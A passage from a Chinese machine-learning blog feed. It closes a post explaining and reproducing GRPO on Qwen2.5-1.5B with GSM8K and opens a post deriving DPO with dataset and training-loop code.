rewards不一定能定义，这种情况下，也许还得和前面PPO算法类似，去训练一个通用的Reward Model来辅助。</p><hr><p>对于第一点，既然都定义了基于规则的奖励函数了，那么Reward Model、Critic Model自然是不需要了。</p><p>我们来看第三点。</p><p>在PPO算法中，优势函数的计算分为以下步骤：</p><ol><li>通过Critic Model计算每个token的Value。</li><li>通过每个token的Value计算TD delta（时序差分序列）。</li><li>通过时序差分序列按GAE算法计算优势函数。</li></ol><p>对这一过程的细节不太了解的朋友可以翻看我前面的文章：<a href="/blog/12706/">PPO算法</a>、<a href="/blog/12778/">RLHF实践</a>。</p><p>由此可见，PPO算法中的优势函数也是token-level的，即每个token对应一个优势值。</p><p>但在GRPO算法中，则有所不同，如论文中所写，GRPO算法使用的优势函数是通过组内每个样本的Reward计算得来的：</p><script type="math/tex; mode=display">A_i=\frac{r_i-\text{mean}(\{r_1,r_2,\dots,r_G\})}{\text{std}(\{r_1,r_2,\dots,r_G\})}</script><p>诶，我们发现，这样一来，相当于每个样本中的所有token是共享同一个优势函数值的。</p><hr><p>再看第四点和第五点，我们回顾PPO算法的优化目标：</p><script type="math/tex; mode=display">\max_{\pi_\theta}\mathbb{E}_{x\in X,y\sim\pi_{\theta}(*\mid x)}[R(x,y)-\beta\cdot\mathbb{D}_{\text{KL}}(\pi_\theta(*\mid x)\|\pi_\text{ref}(*\mid x))]</script><p>在Reward中添加了一个KL散度惩罚项，而GRPO算法中则将这一项惩罚项移到了损失函数中：</p><script type="math/tex; mode=display">\frac{1}{G} \sum_{i=1}^{G} \left(     \min\left(         \frac{\pi_\theta(o_i \mid q)}{\pi_{\theta_{\text{old}}}(o_i \mid q)} A_i,\         \operatorname{clip}\left(             \frac{\pi_\theta(o_i \mid q)}{\pi_{\theta_{\text{old}}}(o_i \mid q)},\ 1 - \varepsilon,\ 1 + \varepsilon         \right) A_i     \right)     - \beta\cdot\mathbb{D}_{\text{KL}}\left( \pi_\theta \,\|\, \pi_{\text{ref}} \right)\right)</script><p>容易发现，除掉多了个分组大小 <script type="math/tex">G</script>​ 以外，GRPO的损失函数前半部分与PPO是完全一致的，而后面多出来的部分就是KL散度惩罚项。</p><p>PPO中，计算KL散度的公式是：</p><script type="math/tex; mode=display">\mathbb{D}_{\text{KL}} ( \pi_{\theta} \,\|\, \pi_{\text{ref}} ) = \log \frac{\pi_{\theta}(o_i \mid q)}{\pi_{\text{ref}}(o_i \mid q)}</script><p>而在GRPO中，论文采用了下面这个公式：</p><script type="math/tex; mode=display">\mathbb{D}_{\text{KL}}(\pi_\theta \,\|\, \pi_{\text{ref}}) = \frac{\pi_{\text{ref}}(o_i \mid q)}{\pi_\theta(o_i \mid q)} - \log \frac{\pi_{\text{ref}}(o_i \mid q)}{\pi_\theta(o_i \mid q)} - 1</script><p>显然，前者是后者的一个一阶近似，故后者能够更准确地估计真实的KL散度。</p><h2 id="GRPO算法复现"><a href="#GRPO算法复现" class="headerlink" title="GRPO算法复现"></a>GRPO算法复现</h2><ul><li>Pretrained-Model：<a href="https://huggingface.co/Qwen/Qwen2.5-1.5B-Instruct">Qwen/Qwen2.5-1.5B-Instruct</a> (太惨了，即使套了LoRA也只训的动1.5B)</li><li>Dataset：<a href="https://huggingface.co/datasets/openai/gsm8k">openai/gsm8k</a> 包含数千道英文小学数学题的数据集，每条数据包含一个<code>answer</code>字段，提供问题的解答，并且固定了纯数字答案格式：置于末尾<code>####</code>之后。</li><li>Task：让模型具备使用思维链解决数学问题的能力。</li></ul><h3 id="奖励函数定义"><a href="#奖励函数定义" class="headerlink" title="奖励函数定义"></a>奖励函数定义</h3><p>与论文一致，我们主要定义了两个奖励函数：</p><ol><li>准确性奖励：我们要求模型给出问题的答案，如答案准确则奖励。</li><li>格式奖励：要求模型将思考过程包含在一对<code>&lt;think&gt;</code>和<code>&lt;/think&gt;</code>之间，并且将最终答案包含在一对<code>&lt;answer&gt;</code>和<code>&lt;/answer&gt;</code>之间，如格式准确则奖励。</li></ol><p>另外，考虑到严格达成两个奖励函数非常困难，我们还相应地提供了两个稍宽松的奖励。</p><ol><li>只要答案是一个纯数字，就给一定的奖励。</li><li>只要匹配到了<code>&lt;think&gt;</code>、<code>&lt;/think&gt;</code>、<code>&lt;answer&gt;</code>和<code>&lt;/answer&gt;</code>中的一部分，就给一定的奖励，但如果匹配到多个，则扣除奖励。</li></ol><p>奖励函数的定义详见<a href="https://github.com/windshadow233/tiny-llm-training/blob/main/GRPO/cot_reward.py">此文件</a>。</p><h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><p>我们直接套用<code>Qwen/Qwen2.5-1.5B-Instruct</code>模型对应的tokenizer所提供的chat template，并定义一个系统提示词：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">You are given a problem.Think about it and provide your working out.Place it between &lt;think&gt; and &lt;&#x2F;think&gt;.Then, provide your numeric answer between &lt;answer&gt; and &lt;&#x2F;answer&gt;. For example:&lt;think&gt;...&lt;&#x2F;think&gt;&lt;answer&gt;...&lt;&#x2F;answer&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>核心代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">extract_hash_answer</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"####"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> text<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">return</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"####"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">__getitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> self<span class="token punctuation">.</span>dataset<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>    question <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span>    answer <span class="token operator">=</span> self<span class="token punctuation">.</span>extract_hash_answer<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        prompt <span class="token operator">=</span> self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>apply_chat_template<span class="token punctuation">(</span><span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>system_prompt<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> question<span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span> add_generation_prompt<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> tokenize<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token string">'prompt'</span><span class="token punctuation">:</span> prompt<span class="token punctuation">,</span>        <span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="训练流程"><a href="#训练流程" class="headerlink" title="训练流程"></a>训练流程</h3><p>甚至连伪代码都懒得写了，大概写一下流程吧：</p><ol><li>定义一个数据收集容器：Data Buffer。</li><li>从数据集中取一条 prompt，生成 <script type="math/tex">G</script> 条输出序列，从而得到大小为 <script type="math/tex">G</script> 的分组。</li><li>根据定义好的奖励函数，对步骤 2 生成分组内的所有输出序列计算得分，然后在组内进行比较，求得相对得分（作为优势函数）。由此，得到一组数据。</li><li>将步骤 3 得到的数据添加到Data Buffer。</li><li>若Data Buffer的大小达到一次迭代需要的数据量（等效 Batch size），则进入步骤 6，否则回到步骤 2。</li><li>遍历Data Buffer，每次取Batch size个数据，按前面的公式计算KL散度、损失函数，并进行策略迭代。</li><li>遍历完成，清空Data Buffer，回到步骤 2。</li></ol><p>本部分完整代码见文末仓库。</p><h3 id="训练效果"><a href="#训练效果" class="headerlink" title="训练效果"></a>训练效果</h3><p>训练曲线：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/cd33ab82-0cc9-4a4b-ad91-9f80638526d9.png" style="zoom:30%;" /></p><p>注意到总体 Reward 还是在上升的，并且我们还分别记录观察了三个独立的Reward函数的变化趋势，发现模型在准确率、格式方面都有所提升，唯独这个Soft Format在上升到一定程度后有所下降，观察到模型有时会重复输出answer的闭合tag：<code>&lt;/answer&gt;</code>，目前还不知道是什么原因（明明给了一定的惩罚？）。</p><p>另外，每隔10次迭代，打印了一下模型生成的结果，发现模型确实能做对一些题，并且在格式上也有所对齐，思考过程有模有样。下面贴出几个例子。</p><div class="gallery-container" data-type="data" data-button="">      <div class="gallery-data">[{"url":"https://blogfiles.oss.fyz666.xyz/png/ef15f64a-6882-474b-b237-c9a27e04b710.png","alt":""},{"url":"https://blogfiles.oss.fyz666.xyz/png/4b50a5c7-e054-4e18-aa09-52a3a2ff3207.png","alt":""},{"url":"https://blogfiles.oss.fyz666.xyz/png/4d8c53f8-110a-4b98-b351-3fb056558503.png","alt":""},{"url":"https://blogfiles.oss.fyz666.xyz/png/8da29788-480a-4dc7-bac6-c1c5b19ecf15.png","alt":""}]</div>      <div class="gallery-items">      </div>    </div><p>最终，博主将迭代了400个step的模型与未经过训练的初始模型进行了测试与对比，结果如下：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">Qwen Accuracy: 0.4314 Formatted: 0.6088 GRPO Accuracy: 0.5610 Formatted: 0.9121<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可见经过GRPO迭代的模型已经具备了较强的格式对齐能力，在准确率方面也有了一定的提升，意味着训练还是有一定的效果的。</p><hr><p>本文相关代码已开源于下面仓库：</p><a class="tag-Link" target="_blank" href=" https://github.com/windshadow233/tiny-llm-training/">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">tiny-llm-training</div>            <div class="tag-link-sitename"> GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><div class="note warning simple"><p><del>由于实验中途突然被抓去跑了一些别的东西，只好先把实验停了，在无法确保实验最终效果的情况下，尚未开源本文代码，敬请期待！</del></p><p>只是实现了一个微小的demo，在细节方面仍有所欠缺，有待进一步斟酌，希望大佬们不吝赐教！</p></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;前情提要&quot;&gt;&lt;a href=&quot;#前情提要&quot; class=&quot;headerlink&quot; title=&quot;前情提要&quot;&gt;&lt;/a&gt;前情提要&lt;/h2&gt;&lt;div class=&quot;note primary simple&quot;&gt;&lt;p&gt;2025年1月27日，因中国 AI 初创企业</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="大语言模型训练" scheme="https://blog.fyz666.xyz/categories/%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    
    
    <category term="机器学习" scheme="https://blog.fyz666.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://blog.fyz666.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
    <category term="强化学习" scheme="https://blog.fyz666.xyz/tags/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="GRPO 算法" scheme="https://blog.fyz666.xyz/tags/grpo-%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>大语言模型训练原理与实践（六）：DPO算法</title>
    <link href="https://blog.fyz666.xyz/blog/12794/"/>
    <id>https://blog.fyz666.xyz/blog/12794/</id>
    <published>2025-07-03T06:35:06.000Z</published>
    <updated>2025-08-14T08:53:41.569Z</updated>
    
    <content type="html"><![CDATA[<p>前面几篇文章已经基本实现了常规RLHF算法训练大模型的流程，从监督微调（SFT）、奖励模型训练（RM）到使用 PPO 进行强化学习（RL）优化模型行为。然而，我们同样注意到了当前用于强化学习的PPO算法有一些缺点：训练过程复杂、硬件资源消耗大，还往往训练不稳定、调参困难。</p><p>为了解决常规RLHF算法中的这些问题，研究者随后提出了<strong>DPO（Direct Preference Optimization）算法</strong>，它能够绕过RLHF算法中的奖励模型训练以及后面的强化学习训练阶段，在完成监督微调之后，直接通过人类偏好对比数据对模型进行对齐优化，相当于实现了<strong>不需要RL的RLHF</strong>。</p><p>建议有兴趣深入了解的朋友直接阅读原论文。</p><a class="tag-Link" target="_blank" href=" https://arxiv.org/abs/2305.18290">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/arxiv.org?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">Direct Preference Optimization</div>            <div class="tag-link-sitename"> $\text{ar}\chi\text{iv}$​</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><hr><h2 id="PPO算法的优化目标"><a href="#PPO算法的优化目标" class="headerlink" title="PPO算法的优化目标"></a>PPO算法的优化目标</h2><p>前面提到的PPO算法作为一种强化学习算法，其在大语言模型训练任务上，优化的最终目标实际上是生成token序列的Reward的期望值，假设我们已经有了一个完美的Reward Model：<script type="math/tex">R(x,y)</script>，表示给定prompt <script type="math/tex">x</script> 且模型输出token序列为 <script type="math/tex">y</script> 时的Reward，我们可以将优化目标简单写为：</p><script type="math/tex; mode=display">\max_{\pi_\theta}\mathbb{E}_{x\in X,y\sim\pi_{\theta}(*\mid x)}[R(x,y)]</script><p>不过，考虑到实际训练时需要对模型策略的KL散度做一个约束，我们还要在优化目标中添加一个惩罚项，于是优化目标实际上是：</p><script type="math/tex; mode=display">\max_{\pi_\theta}\mathbb{E}_{x\in X,y\sim\pi_{\theta}(*\mid x)}[R(x,y)-\beta\cdot\mathbb{D}_{\text{KL}}(\pi_\theta(*\mid x)\|\pi_\text{ref}(*\mid x))]</script><p>上式中，<script type="math/tex">\beta</script> 是惩罚系数，<script type="math/tex">\pi_{\text{ref}}(y\mid x)</script> 则是参考模型给出的概率分布。<script type="math/tex">\mathbb{D}_{\text{KL}}(* \| *)</script> 表示两个概率分布的KL散度，其定义如下：</p><script type="math/tex; mode=display">\mathbb{D}_{\text{KL}}(\pi_1(*\mid x) \| \pi_2(*\mid x)) =\mathbb{E}_{y\sim\pi_1(*\mid x)}[\log\frac{\pi_1(y\mid x)}{\pi_2(y\mid x)}]</script><h2 id="求解优化目标"><a href="#求解优化目标" class="headerlink" title="求解优化目标"></a>求解优化目标</h2><p>将KL散度表达式代入优化目标，得到：</p><script type="math/tex; mode=display">\max_{\pi_\theta}\mathbb{E}_{x\in X,y\sim\pi_{\theta}(*\mid x)}[R(x,y)-\beta\cdot\log\frac{\pi_\theta(y\mid x)}{\pi_\text{ref}(y\mid x)}]</script><p>将其改为求极小值，除以常数 <script type="math/tex">\beta</script>，并稍加变形，得到：</p><script type="math/tex; mode=display">\begin{aligned}&\min_{\pi_\theta}\mathbb{E}_{x\in X,y\sim\pi_{\theta}(*\mid x)}[\log\frac{\pi_\theta(y\mid x)}{\pi_\text{ref}(y\mid x)}-\frac{1}{\beta}\cdot R(x,y)]\\&=\min_{\pi_\theta}\mathbb{E}_{x\in X,y\sim\pi_{\theta}(*\mid x)}[\log\frac{\pi_\theta(y\mid x)}{\pi_\text{ref}(y\mid x)\exp(\frac{1}{\beta}\cdot R(x,y))}]\end{aligned}</script><p>这里，论文做了一个操作，强行让对数部分成为一个新的 KL散度，即让分母部分通过一个归一化操作成为概率分布：</p><p>定义 <script type="math/tex">Z(x)</script>：</p><script type="math/tex; mode=display">Z(x) = \sum_{y}\pi_\text{ref}(y\mid x)\exp(\frac{1}{\beta}\cdot R(x,y))</script><p>可见 <script type="math/tex">Z(x)</script> 是关于 <script type="math/tex">x</script> 的函数，并且只与 <script type="math/tex">\pi_\text{ref}</script> 、奖励模型有关，与待训练模型 <script type="math/tex">\pi_\theta</script> 无关。</p><p>将 <script type="math/tex">Z(x)</script> 引入优化目标 <script type="math/tex">\log</script> 运算的分母，再从外部减去，我们得到：</p><script type="math/tex; mode=display">\min_{\pi_\theta}\mathbb{E}_{x\in X,y\sim\pi_{\theta}(*\mid x)}[\log\frac{\pi_\theta(y\mid x)}{\frac{1}{Z(x)}\pi_\text{ref}(y\mid x)\exp(\frac{1}{\beta}\cdot R(x,y))}-\log Z(x)]</script><p>此时，左侧的对数就变成了一个KL散度的形式了，我们记 </p><script type="math/tex; mode=display">\pi^*(y\mid x)\overset{\triangle}{=}\frac{1}{Z(x)}\pi_\text{ref}(y\mid x)\exp(\frac{1}{\beta}\cdot R(x,y))</script><p>容易验证 <script type="math/tex">\pi^*(*\mid x)</script> 是一个概率分布，因此，上式可以写为：</p><script type="math/tex; mode=display">\min_{\pi_\theta}\mathbb{E}_{x\in X}[\mathbb{D}_\text{KL}(\pi_\theta(*\mid x)\|\pi^*(*\mid x))-\log Z(x)]</script><p>显然，由于上式的右侧项 <script type="math/tex">\log Z(x)</script> 与 <script type="math/tex">\pi_\theta</script> 无关，我们可以忽略它。又从KL散度的性质得到，当且仅当</p><script type="math/tex; mode=display">\pi_\theta(y\mid x) = \pi^*(y\mid x)=\frac{1}{Z(x)}\pi_\text{ref}(y\mid x)\exp(\frac{1}{\beta}\cdot R(x,y))</script><p>时，KL散度达到最小值0。</p><p>看上去我们已经直接求出了目标的显式解，但可惜的是，这个 <script type="math/tex">Z(x)</script> 并不好计算，因为它需要对于一个prompt <script type="math/tex">x</script>，遍历所有Reference Model可能产生的 <script type="math/tex">y</script> 才能精确计算，如用蒙特卡洛方法估计，也得采样相当数量的 <script type="math/tex">y</script>​，这个过程十分消耗算力。</p><p>另外，这个解还依赖于我们训练好的完美的 <script type="math/tex">R(x,y)</script>，因此在论文作者看来还不够方便，毕竟他们的目标是想要跳过后面两个步骤。</p><h2 id="新的优化目标"><a href="#新的优化目标" class="headerlink" title="新的优化目标"></a>新的优化目标</h2><p>将 <script type="math/tex">R(x,y)</script> 用两个概率分布以及 <script type="math/tex">Z(x)</script> 反过来表示：</p><script type="math/tex; mode=display">\begin{aligned}R(x,y)&=\beta\log(Z(x)\frac{\pi^*(y\mid x)}{\pi_\text{ref}(y\mid x)})\\&=\beta\log\frac{\pi^*(y\mid x)}{\pi_\text{ref}(y\mid x)}+\beta\log Z(x)\end{aligned}</script><p>我们考虑前面训练Reward Model时用到的偏序数据对 $(x,y_c,y_r)$：其中 <script type="math/tex">x</script> 为 prompt，<script type="math/tex">y_c</script> 表示 chosen 的回复，<script type="math/tex">y_r</script> 表示 rejected 的回复。</p><p>对于偏序数据的建模，论文中提到了<strong><a href="https://en.wikipedia.org/wiki/Bradley%E2%80%93Terry_model">Bradley-Terry Model</a></strong>。</p><p>简单说来，它通过一个定量公式估计了一对比较对象的两种比较结果分别发生的可能性：</p><script type="math/tex; mode=display">P(i \succ j)=\frac{p_i}{p_i+p_j}</script><p>其中，<script type="math/tex">i \succ j</script> 表示在某种标准上 <script type="math/tex">i</script>  超越了 <script type="math/tex">j</script>，<script type="math/tex">p_i,p_j</script>​ 分别表示两个对象的某种得分（得分必须为正数）。</p><p>在建模 <script type="math/tex">(x,y_c,y_r)</script> 这一文本问答的偏序数据时，论文采用了下述公式：</p><script type="math/tex; mode=display">\begin{aligned}P(y_c \succ y_r) &= \frac{\exp R(x,y_c)}{\exp R(x,y_c)+\exp R(x,y_r)}\\&=\frac{1}{1+\exp [-(R(x,y_c)-R(x,y_r))]}\\&=\sigma(R(x,y_c)-R(x,y_r))\end{aligned}</script><p>其中 <script type="math/tex">\sigma(s)=\frac{1}{1+\exp(-s)}</script> 为 Sigmoid 函数。</p><p>考虑到我们在最大化一个概率分布时，一般会去最小化其负对数似然，因此我们可以写出优化目标：</p><script type="math/tex; mode=display">-\log P(y_c \succ y_r) = -\log\sigma(R(x,y_c)-R(x,y_r))</script><p>这个目标有一个很大的好处在于，当我们把</p><script type="math/tex; mode=display">R(x,y)=\beta\log\frac{\pi^*(y\mid x)}{\pi_\text{ref}(y\mid x)}+\beta\log Z(x)</script><p>代入时，会发现正好把那坨 <script type="math/tex">Z(x)</script> 消掉了，从而得到下式：</p><script type="math/tex; mode=display">-\log\sigma[\beta(\log\frac{\pi^*(y_c\mid x)}{\pi_\text{ref}(y_c\mid x)}-\frac{\pi^*(y_r\mid x)}{\pi_\text{ref}(y_r\mid x)})]</script><p>这便是最终的优化目标。由此，我们的目标函数只与 <script type="math/tex">\pi^*</script> 相关，已经绕开了之前奖励模型的训练过程。</p><hr><p>综上，我们基本将论文中涉及到的核心过程推导了一遍，构造了一个无需奖励模型的优化目标，相比于PPO算法，DPO算法的最终形式简洁了不少，省去了显式的奖励模型训练过程，在优化过程中用到的模型也少了一半，节省了计算资源。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h3><p>偏好数据集仍然使用了与之前相同的<a href="https://huggingface.co/datasets/OpenLLMAI/comparison_data">OpenLLMAI/comparison_data</a>，数据集的定义方法与前面训练Reward Model时类似，不过为了便于后续计算损失函数，这里我额外算了一个<code>label_mask</code>，用来屏蔽prompt和padding部分，防止这部分参与loss的计算。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">build_inputs</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> prompt_ids<span class="token punctuation">,</span> response_ids<span class="token punctuation">)</span><span class="token punctuation">:</span>    input_ids <span class="token operator">=</span> prompt_ids <span class="token operator">+</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>bos_token_id<span class="token punctuation">]</span> <span class="token operator">+</span> response_ids    input_ids <span class="token operator">=</span> input_ids<span class="token punctuation">[</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>max_length<span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_ids<span class="token punctuation">)</span> <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>max_length<span class="token punctuation">:</span>        input_ids <span class="token operator">+=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>eos_token_id<span class="token punctuation">]</span>    bos_pos <span class="token operator">=</span> input_ids<span class="token punctuation">.</span>index<span class="token punctuation">(</span>self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>bos_token_id<span class="token punctuation">)</span>    label_mask <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>bos_pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>input_ids<span class="token punctuation">)</span> <span class="token operator">-</span> bos_pos <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    pad_len <span class="token operator">=</span> self<span class="token punctuation">.</span>max_length <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_ids<span class="token punctuation">)</span>    <span class="token keyword">if</span> pad_len <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        input_ids <span class="token operator">+=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>pad_token_id<span class="token punctuation">]</span> <span class="token operator">*</span> pad_len        label_mask <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> pad_len    attention_mask <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>max_length <span class="token operator">-</span> pad_len<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> pad_len    <span class="token keyword">return</span> input_ids<span class="token punctuation">,</span> attention_mask<span class="token punctuation">,</span> label_mask<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>计算 <script type="math/tex">\pi(y\mid x)</script> ，采用了取对数概率（<code>logits</code>）然后求和的方式，不过在计算得到了<code>logits</code>之后，需要先用前面计算得到的<code>label_mask</code>对prompt和padding部分做一个屏蔽，再进行求和：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">masked_sum</span><span class="token punctuation">(</span>values<span class="token punctuation">,</span> labels_mask<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>values <span class="token operator">*</span> labels_mask<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h3><p>核心部分的代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> step<span class="token punctuation">,</span> batch <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">enumerate</span><span class="token punctuation">(</span>dataloader<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> desc<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"Epoch </span><span class="token interpolation"><span class="token punctuation">&#123;</span>epoch <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num_epochs<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> dynamic_ncols<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> total<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>dataloader<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    input_ids <span class="token operator">=</span> batch<span class="token punctuation">[</span><span class="token string">'input_ids'</span><span class="token punctuation">]</span>    label_mask <span class="token operator">=</span> batch<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'label_mask'</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        logits_ref <span class="token operator">=</span> model_ref<span class="token punctuation">(</span><span class="token operator">**</span>batch<span class="token punctuation">)</span><span class="token punctuation">.</span>logits        log_prob_ref <span class="token operator">=</span> calculate_action_logsoftmax<span class="token punctuation">(</span>logits_ref<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> input_ids<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log_prob_ref <span class="token operator">=</span> filter_mask<span class="token punctuation">(</span>log_prob_ref<span class="token punctuation">,</span> label_mask<span class="token punctuation">)</span>        log_prob_ref_chosen<span class="token punctuation">,</span> log_prob_ref_rejected <span class="token operator">=</span> log_prob_ref<span class="token punctuation">.</span>chunk<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> dim<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> accelerator<span class="token punctuation">.</span>accumulate<span class="token 